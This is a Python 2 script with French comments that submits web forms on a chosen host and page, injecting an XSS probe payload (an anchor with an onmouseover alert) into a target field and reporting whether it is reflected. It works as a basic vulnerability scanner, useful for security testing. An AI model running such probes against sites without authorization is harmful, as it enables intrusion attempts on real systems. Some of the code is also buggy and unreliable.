#! /usr/bin/env python
# -*- coding: utf-8 -*-

from http import *

import urllib
import os

class FormAttack():
    def __init__(self, host, page, cookie = None):
        self.target = HTTP(host, header = {'Cookie': cookie} if cookie else {})
        self.page = page

    def selectForms(self, forms):
        """
            Identifie les formulaires contenant un champs portant le nom de celui
            que l'on cible. Si le champs porte un nom comme 'name' ou 'email', il
            est probable d'avoir plusieurs formulaires qui correspondent.
        """

        selected_forms = []

        for form in forms:
            if self.fieldname in form['inputs']:
                selected_forms.append(form)

        if len(selected_forms) > 1:
            self.printForms(selected_forms)
            id = -1
            while id < 0 or id > len(selected_forms):
                id = input('Plusieurs formulaires affichés ci-dessus ont été trouvés.\nMerci de spécifier celui à utiliser (rentrer un l\'ID entre 0 et ' + str(len(selected_forms) - 1) + ') ? ')
        elif len(selected_forms) == 0:
            print "Aucun formulaire contenant un champ '" + fieldname + "'. Abandon."
            return 0
        else: id = 0

        return selected_forms[id]

    def printForms(self, forms):
        for i in range(len(forms)):
            print "Form ID: ", i
            print "Method: ", forms[i]['method']
            print "Action: ", forms[i]['action']
            print "Inputs:"
            for j in forms[i]['inputs']: print '\t- ', j, ': ', forms[i]['inputs'][j]['type'], forms[i]['inputs'][j]
            print '\n\n'

    def fillForm(self, form, fv={}):
        data = {}
        for name in form['inputs']:
            inp = form['inputs'][name]

            # Unused inputs -> continue
            if not 'name' in inp: continue
            if inp['type'] in ['reset']: continue

            #
            if 'value' in inp:
                data[inp['name']] = inp['value']
                continue

            # A améliorer (gestion de plus de types d'inputs)
            elif inp['type'] in ['text', 'password', 'url', 'search', 'textarea']:
                if name in fv:
                    data[name] = fv[name]
                elif 'required' in inp and not (name in fv):
                    data[name] = "xss testing"
                else: data[name] = ""

            elif inp['type'] == 'radio':
                data[name] = inp['value']
            else: data[name] = ""

        data[self.fieldname] = self.PAYLOAD
        return data

    def run(self, fieldname, fieldvalue = {}):
        self.target.GET(self.page)
        self.fieldname = fieldname

        form = self.selectForms(self.target.getForms(self.page))

        formdata = urllib.urlencode(self.fillForm(form, fieldvalue))

        if (not 'action' in form) or form['action'] == '': form_dest = self.page
        else: form_dest = os.path.normpath(os.path.join(os.path.dirname(self.page), form['action']))

        if form['method'].lower() == 'post': out = self.target.POST(form_dest, data=formdata)
        elif form['method'].lower() == 'get': out = self.target.GET(form_dest + '?' + formdata)

        return out


class XSS(FormAttack):
    PAYLOAD = "<a onmouseover=\"alert('" + getUniqueID() + "')\">x</a>"

    def run(self, fieldname, fieldvalue = {}):

        # Calling FormAttack run method
        out = FormAttack.run(self, fieldname, fieldvalue)

        if XSS.PAYLOAD in out['data']:
            print "Faille XSS exploitable sur " + os.path.join(self.target.host, self.page)
            return True
        else:
            print "Faille XSS non exploitable sur " + os.path.join(self.target.host, self.page)
            return False
